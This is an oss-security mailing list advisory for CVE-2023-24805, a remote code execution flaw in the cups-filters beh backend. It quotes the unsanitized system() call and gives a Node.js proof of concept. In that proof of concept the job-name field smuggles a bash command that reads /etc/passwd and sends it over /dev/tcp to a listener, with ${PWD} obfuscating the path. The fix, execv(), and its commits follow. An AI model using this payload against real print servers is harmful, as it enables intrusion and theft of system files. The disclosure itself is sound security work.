Received: (qmail 20362 invoked by uid 550); 17 May 2023 12:14:27 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6098 invoked from network); 17 May 2023 09:30:25 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20221208; t=1684315813; x=1686907813;
        h=content-transfer-encoding:content-language:to:subject:from
         :user-agent:mime-version:date:message-id:from:to:cc:subject:date
         :message-id:reply-to;
        bh=o3LdYdLUPTaDbKohednoNdoYfbnWjvc9Wv3Y5QBFlRw=;
        b=YKGlOB0WPwvKxXj+vuVfxV95fDw92JDe7x/ewqIFVeYyLEq4WVBF+And62POH6Wa3s
         xsW9x5UfBERt8dMR8R197vT4WZ/tH0UCmweO2hNTYfrQ++lx3C8FFgMJ3kH/bqaUOQNz
         riw7Fd6P40p5ZyNdJEN136a4T9CI3O9MgTQ3A3mqhaEM3Jj9Oij9V/TjlUeXWoC8M/Q2
         fD45Uv4nicH5x0WpKEyFGI8fonoMV0kuCRuWmWRK7CzgTsOFxbHZOBtpieIUzJu/p8MH
         GIjieS7YPyRKM8ftfwpUXpz8S/O/aytXiMCAQHX1uQYmww4xjfEIlug/cLQGWW3UwrdN
         jjbg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20221208; t=1684315813; x=1686907813;
        h=content-transfer-encoding:content-language:to:subject:from
         :user-agent:mime-version:date:message-id:x-gm-message-state:from:to
         :cc:subject:date:message-id:reply-to;
        bh=o3LdYdLUPTaDbKohednoNdoYfbnWjvc9Wv3Y5QBFlRw=;
        b=Pld18mppngix+UJ3Ax2fdlHwSTlGRYvyQqo1Ex+mj4GgXXhfUen+BLP76ylmK7+HQ5
         CNDLEARhGTW0+GKv0BjTmFdQYYSw3RD4xdqxkfibogNlCSovx6QRuHKwv9x+AYFdbSXI
         pm2+HTTcs8TQFGDsRWgy96ELRbwAx2b+o/WUeATIebq9oijVbg0jRThV9yIHNXVMxkpM
         IFqvOZQHDJe8sXRgWlyKPQEJA7Jd/kOC12aGXnGz5nhVpRQPzfU98Xrawo03VL6J/gDe
         OHdnJnbZKU20loNqWg9z67NsinCCvBcJEWto6ixDL6I/9CxYh7yiPuDiZREvoL8BAOtf
         8qZw==
X-Gm-Message-State: AC+VfDzkQentrGrqCkT0lsJ4s2TKp4KiWdihyn99JbNWKIIhzJ/85mkw
	JbPMNiZJb6HhdXSL5BafJh3LKJ/9udI=
X-Google-Smtp-Source: ACHHUZ4Pj5n4IGJVboaaOcayWTZpcdkghAlrpPF3nTqZSxIxJiNe02LYW3BktyDiG38prCz7PIdvnw==
X-Received: by 2002:a17:907:6287:b0:94f:29f0:edc0 with SMTP id nd7-20020a170907628700b0094f29f0edc0mr38907383ejc.44.1684315813208;
        Wed, 17 May 2023 02:30:13 -0700 (PDT)
Message-ID: <d20c573e-81ca-800d-5bf8-c2f96b31ea82@gmail.com>
Date: Wed, 17 May 2023 11:30:11 +0200
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
 Thunderbird/102.11.0
From: Till Kamppeter <till.kamppeter@gmail.com>
To: oss-security@lists.openwall.com
Content-Language: en-US
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
Subject: [oss-security] CVE-2023-24805: RCE in cups-filters, beh CUPS backend

Following bug got reported to OpenPrinting's GitHub, repo cups-filters, 
as a private (security) issue report:

https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x

Summary

If you use "beh" to create an accessible network printer, this security 
vulnerability can cause remote code execution.

Details

cups-filters/backend/beh.c

Line 288 in 5c9498a
   retval = system(cmdline) >> 8;

     // (context: argv = beh <job-id> <user> <title> <copies> <options> 
[file])
      snprintf(cmdline, sizeof(cmdline),
      "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
      cups_serverbin, scheme, argv[1], argv[2], argv[3],
            ...
      (argc == 6 ? "1" : argv[4]),
      argv[5], filename);
            ...
    retval = system(cmdline) >> 8;

The system function will be called here to execute the command, and the 
user and title parameters are user-controlled and unsanitized .

PoC

      start a beh service lpadmin -p myprinter -E -v 
beh:/1/3/5/socket://printer:9100

      exploit: // https://github.com/williamkapke/ipp

var ipp = require('ipp');
var PDFDocument = require('pdfkit');
var concat = require("concat-stream");

var doc = new PDFDocument({margin:0});
doc.text("1.pdf", 0, 0);


doc.pipe(concat(function (data) {
var printer = ipp.Printer("http://127.0.0.1:6310/printers/myprinter");
var msg = {
"operation-attributes-tag": {
"requesting-user-name": "Bumblebee",
"job-name": "';env; bash -c \"/usr/bin/cat ${PWD}etc/${PWD}/passwd > 
${PWD}dev${PWD}tcp${PWD}127.0.0.1${PWD}1337\";'' #.pdf",
"document-format": "application/pdf"
},
"job-attributes-tag":{
        "media-col": {
          "media-source": "tray-2"
        }
}
, data: data
};
printer.execute("Print-Job", msg, function(err, res){
console.log(err);
console.log(res);
});
}));
doc.end();


The report got assigned CVE-2023-24805

A fix is to use execv() instead of system() and was proposed as a pull 
request attached to the bug report.

https://github.com/OpenPrinting/cups-filters-ghsa-gpxc-v2m8-fr3x/pull/1

The pull request is merged now into

https://github.com/OpenPrinting/cups-filters (branch "master")

as commit

https://github.com/OpenPrinting/cups-filters/commit/8f274035756

and the fix is also ported to the "1.x" branch of cups-filters, as commit

https://github.com/OpenPrinting/cups-filters/commit/93e60d3df35

The fix will also be included in the upcoming releases, 2.0.0 and 1.28.18.

    Till
